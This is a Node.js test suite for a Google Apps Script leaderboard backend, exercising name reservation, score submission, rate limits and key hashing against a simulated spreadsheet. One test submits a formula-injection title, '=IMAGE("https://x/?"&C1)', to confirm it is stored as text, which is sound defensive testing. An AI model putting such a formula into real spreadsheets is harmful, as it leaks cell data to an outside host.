// Testes do scripts/ranking_apps_script.gs fora do Google: `node scripts/ranking_apps_script.test.js`.
// Roda o .gs num contexto com uma planilha em memória e os serviços do Apps Script simulados.
'use strict';
const fs = require('fs');
const vm = require('vm');
const crypto = require('crypto');
const assert = require('assert');

function newContext() {
  const sheets = {};
  const props = {};
  const cache = {};
  // Como o Google Planilhas: sem o formato de texto ('@'), "007" vira 7, "true" vira booleano e "=..." vira
  // fórmula; o apóstrofo no começo força texto (e some na leitura).
  const sheet = (name) => {
    const rows = [];
    let text = false;
    const cell = (v) => {
      if (typeof v !== 'string') return v;
      if (v.startsWith("'")) return v.slice(1);
      if (v.startsWith('=')) return '#FÓRMULA';
      if (text) return v;
      if (/^[+-]?\d+(\.\d+)?$/.test(v)) return Number(v);
      if (v.toLowerCase() === 'true') return true;
      return v;
    };
    return {
      name,
      rows,
      getLastRow: () => rows.length,
      appendRow: (row) => rows.push(row.map(cell)),
      // Como no Google: uma aba vazia devolve uma linha com uma célula vazia.
      getDataRange: () => ({ getValues: () => (rows.length ? rows.map((r) => r.slice()) : [['']]) }),
      getRange: (row, col, numRows, numCols) => ({
        setNumberFormat: (format) => { if (format === '@') text = true; },
        setValues: (values) => {
          for (let i = 0; i < numRows; i++) {
            for (let j = 0; j < numCols; j++) rows[row - 1 + i][col - 1 + j] = cell(values[i][j]);
          }
        },
      }),
    };
  };
  const book = {
    getId: () => 'planilha',
    getSheetByName: (name) => sheets[name] || null,
    insertSheet: (name) => (sheets[name] = sheet(name)),
  };
  const context = {
    sheets,
    console,
    SpreadsheetApp: { create: () => book, openById: () => book },
    PropertiesService: {
      getScriptProperties: () => ({ getProperty: (k) => props[k] || null, setProperty: (k, v) => (props[k] = v) }),
    },
    LockService: { getScriptLock: () => ({ waitLock: () => {}, releaseLock: () => {} }) },
    CacheService: {
      getScriptCache: () => ({ get: (k) => (k in cache ? cache[k] : null), put: (k, v) => (cache[k] = String(v)) }),
    },
    ContentService: {
      MimeType: { JSON: 'json' },
      createTextOutput: (text) => ({ text, setMimeType() { return this; } }),
    },
    Utilities: {
      DigestAlgorithm: { SHA_256: 'sha256' },
      computeDigest: (_alg, value) => Array.from(crypto.createHash('sha256').update(value).digest()).map((b) => (b > 127 ? b - 256 : b)),
    },
  };
  vm.createContext(context);
  vm.runInContext(fs.readFileSync(__dirname + '/ranking_apps_script.gs', 'utf8'), context);
  context.call = (body) => JSON.parse(context.doPost({ postData: { contents: JSON.stringify(body) } }).text);
  return context;
}

// Chaves do tamanho das do app (UUID): o script recusa chaves curtas.
const K = (letter) => letter.repeat(36);

const play = (key, extra) => Object.assign({
  acao: 'enviar', chave: key, mapa: 'm1', titulo: 'Música', artista: 'Banda', dificuldade: 'HARD',
  pontos: 100, precisao: 0.9, combo: 50, perfeitos: 40, semErrar: 30000, notas: 85,
}, extra);

// O placar vem inteiro (todas as dificuldades e números): o celular ordena e filtra na hora.
const boardOf = (c, key, map) => c.call({ acao: 'placar', chave: key, mapa: map || 'm1' }).linhas;

const tests = {
  reservaENomeEmUso() {
    const c = newContext();
    assert.deepStrictEqual(c.call({ acao: 'reservar', nome: 'Rodrigo', chave: K('A') }), { ok: true, nome: 'Rodrigo' });
    assert.strictEqual(c.call({ acao: 'reservar', nome: 'rodrigo', chave: K('B') }).motivo, 'nome_em_uso');
    assert.strictEqual(c.call({ acao: 'reservar', nome: 'ab', chave: K('B') }).motivo, 'nome_invalido');
    assert.strictEqual(c.call({ acao: 'reservar', nome: ' Ana ', chave: K('B') }).nome, 'Ana');
  },
  twoRegistrationsOfTheSameNameOnlyOneWins() {
    const c = newContext();
    const first = c.call({ acao: 'reservar', nome: 'Ana', chave: K('A') });
    const second = c.call({ acao: 'reservar', nome: 'ANA', chave: K('B') });
    assert.strictEqual([first.ok, second.ok].filter(Boolean).length, 1);
  },
  renomearLiberaOAntigoEMantemPontuacoes() {
    const c = newContext();
    c.call({ acao: 'reservar', nome: 'Rodrigo', chave: K('A') });
    c.call(play(K('A')));
    assert.strictEqual(c.call({ acao: 'reservar', nome: 'Digo', chave: K('A') }).ok, true);
    assert.strictEqual(c.call({ acao: 'reservar', nome: 'Rodrigo', chave: K('B') }).ok, true);
    assert.deepStrictEqual(boardOf(c, K('B')).map((l) => [l.nome, l.pontos]), [['Digo', 100]]);
  },
  aWrongKeyCannotRenameOrSubmit() {
    const c = newContext();
    c.call({ acao: 'reservar', nome: 'Rodrigo', chave: K('A') });
    assert.strictEqual(c.call(play(K('X'))).motivo, 'sem_nome');
    assert.strictEqual(c.call({ acao: 'reservar', nome: 'Rodrigo', chave: K('X') }).motivo, 'nome_em_uso');
  },
  guardaOMelhorDeCadaNumero() {
    const c = newContext();
    c.call({ acao: 'reservar', nome: 'Rodrigo', chave: K('A') });
    c.call(play(K('A'), { pontos: 100, combo: 50 }));
    const second = c.call(play(K('A'), { pontos: 90, combo: 70 }));
    assert.deepStrictEqual([second.posicao, second.total], [1, 1]);
    const line = boardOf(c, K('A'))[0];
    assert.deepStrictEqual([line.pontos, line.combo, line.notas], [100, 70, 85]);
  },
  placarTrazTodosComVoceMarcado() {
    const c = newContext();
    [['Ana', K('A'), 300], ['Bruno', K('B'), 200]].forEach(([n, k, p]) => {
      c.call({ acao: 'reservar', nome: n, chave: k });
      c.call(play(k, { pontos: p }));
    });
    c.call(play(K('A'), { dificuldade: 'EXPERT', pontos: 999 }));
    const lines = boardOf(c, K('B'));
    assert.deepStrictEqual(lines.map((l) => [l.nome, l.dificuldade, l.voce]).sort(),
      [['Ana', 'EXPERT', false], ['Ana', 'HARD', false], ['Bruno', 'HARD', true]]);
  },
  semErrarAntigoVemVazio() {
    const c = newContext();
    c.call({ acao: 'reservar', nome: 'Ana', chave: K('A') });
    c.call(play(K('A'), { semErrar: null, notas: null }));
    const line = boardOf(c, K('A'))[0];
    assert.deepStrictEqual([line.semErrar, line.notas], [null, null]);
  },
  musicasComJogadoresESuaPosicao() {
    const c = newContext();
    c.call({ acao: 'reservar', nome: 'Ana', chave: K('A') });
    c.call({ acao: 'reservar', nome: 'Bruno', chave: K('B') });
    c.call(play(K('A'), { pontos: 300 }));
    c.call(play(K('B'), { pontos: 200 }));
    c.call(play(K('B'), { mapa: 'm2', titulo: 'Outra', dificuldade: 'EASY' }));
    const songs = c.call({ acao: 'musicas', chave: K('B'), busca: '' }).musicas;
    const m1 = songs.find((s) => s.mapa === 'm1');
    assert.deepStrictEqual([m1.titulo, m1.jogadores, m1.suaPosicao], ['Música', 2, 2]);
    assert.strictEqual(c.call({ acao: 'musicas', chave: K('B'), busca: 'outr' }).musicas.length, 1);
  },
  semNadaAindaTudoVazio() {
    const c = newContext();
    assert.deepStrictEqual(c.call({ acao: 'musicas', chave: K('A'), busca: '' }).musicas, []);
    assert.deepStrictEqual(boardOf(c, K('A')), []);
  },
  nomesQueAPlanilhaConverteContinuamUnicos() {
    const c = newContext();
    assert.strictEqual(c.call({ acao: 'reservar', nome: '007', chave: K('A') }).ok, true);
    assert.strictEqual(c.call({ acao: 'reservar', nome: '007', chave: K('B') }).motivo, 'nome_em_uso');
    c.call({ acao: 'reservar', nome: 'true', chave: K('C') });
    c.call(play(K('A')));
    c.call(play(K('C')));
    assert.deepStrictEqual(boardOf(c, K('A')).map((l) => l.nome).sort(), ['007', 'true']);
  },
  tituloComIgualNaoViraFormula() {
    const c = newContext();
    c.call({ acao: 'reservar', nome: 'Ana', chave: K('A') });
    c.call(play(K('A'), { titulo: '=IMAGE("https://x/?"&C1)', artista: '+44' }));
    const song = c.call({ acao: 'musicas', chave: K('A'), busca: '' }).musicas[0];
    assert.deepStrictEqual([song.titulo, song.artista], ['=IMAGE("https://x/?"&C1)', '+44']);
  },
  limitePorHora() {
    const c = newContext();
    c.call({ acao: 'reservar', nome: 'Ana', chave: K('A') });
    for (let i = 0; i < 60; i++) assert.strictEqual(c.call(play(K('A'))).ok, true);
    assert.strictEqual(c.call(play(K('A'))).motivo, 'limite');
  },
  chaveGuardadaSoComoHash() {
    const c = newContext();
    c.call({ acao: 'reservar', nome: 'Ana', chave: 'segredo-123-segredo-123' });
    assert.ok(!JSON.stringify(c.sheets).includes('segredo-123-segredo-123'));
  },
  chaveCurtaOuVaziaERecusada() {
    const c = newContext();
    assert.strictEqual(c.call({ acao: 'reservar', nome: 'Ana', chave: '' }).motivo, 'pedido');
    assert.strictEqual(c.call({ acao: 'reservar', nome: 'Ana', chave: 'curta' }).motivo, 'pedido');
    assert.strictEqual(c.call(play('')).motivo, 'pedido');
    // Ler o ranking continua aberto (o celular sem nome ainda não tem chave).
    assert.strictEqual(c.call({ acao: 'musicas', chave: '', busca: '' }).ok, true);
  },
  reservasLimitadasPorCelular() {
    const c = newContext();
    for (let i = 0; i < 5; i++) assert.strictEqual(c.call({ acao: 'reservar', nome: 'Nome' + i, chave: K('A') }).ok, true);
    assert.strictEqual(c.call({ acao: 'reservar', nome: 'Nome9', chave: K('A') }).motivo, 'limite');
    assert.strictEqual(c.call({ acao: 'reservar', nome: 'Outro', chave: K('B') }).ok, true);
  },
  reservasLimitadasNoTotal() {
    const c = newContext();
    for (let i = 0; i < 100; i++) {
      assert.strictEqual(c.call({ acao: 'reservar', nome: 'Jogador' + i, chave: String(i).padStart(36, 'x') }).ok, true);
    }
    assert.strictEqual(c.call({ acao: 'reservar', nome: 'Mais um', chave: K('Z') }).motivo, 'limite');
  },
  variosEnviosNumPedido() {
    const c = newContext();
    c.call({ acao: 'reservar', nome: 'Ana', chave: K('A') });
    const envios = [];
    for (let i = 0; i < 50; i++) envios.push(play(K('A'), { mapa: 'm' + i, acao: undefined, chave: undefined }));
    const answer = c.call({ acao: 'enviarVarios', chave: K('A'), envios });
    assert.strictEqual(answer.ok, true);
    assert.strictEqual(answer.resultados.length, 50);
    assert.deepStrictEqual([answer.resultados[0].ok, answer.resultados[0].posicao], [true, 1]);
    assert.strictEqual(c.call({ acao: 'musicas', chave: K('A'), busca: '' }).musicas.length, 50);
    // Um pedido conta uma vez no limite por hora.
    for (let i = 0; i < 59; i++) c.call(play(K('A')));
    assert.strictEqual(c.call(play(K('A'))).motivo, 'limite');
  },
  variosEnviosRecusaOQueNaoServeSemPerderOResto() {
    const c = newContext();
    c.call({ acao: 'reservar', nome: 'Ana', chave: K('A') });
    const answer = c.call({ acao: 'enviarVarios', chave: K('A'), envios: [play(K('A')), play(K('A'), { mapa: '' })] });
    assert.deepStrictEqual(answer.resultados.map((r) => r.ok ? 'ok' : r.motivo), ['ok', 'pedido']);
  },
  variosEnviosSemNomeOuDemaisERecusado() {
    const c = newContext();
    assert.strictEqual(c.call({ acao: 'enviarVarios', chave: K('A'), envios: [play(K('A'))] }).motivo, 'sem_nome');
    c.call({ acao: 'reservar', nome: 'Ana', chave: K('A') });
    const many = [];
    for (let i = 0; i < 51; i++) many.push(play(K('A')));
    assert.strictEqual(c.call({ acao: 'enviarVarios', chave: K('A'), envios: many }).motivo, 'pedido');
  },
  pedidoEstranhoNaoQuebra() {
    const c = newContext();
    assert.strictEqual(JSON.parse(c.doPost({ postData: { contents: 'não é json' } }).text).ok, false);
    assert.strictEqual(c.call({ acao: 'outra' }).ok, false);
  },
};

let failed = 0;
for (const [name, test] of Object.entries(tests)) {
  try {
    test();
    console.log('ok   ' + name);
  } catch (e) {
    failed++;
    console.log('FAIL ' + name + ': ' + e.message);
  }
}
if (failed) process.exit(1);
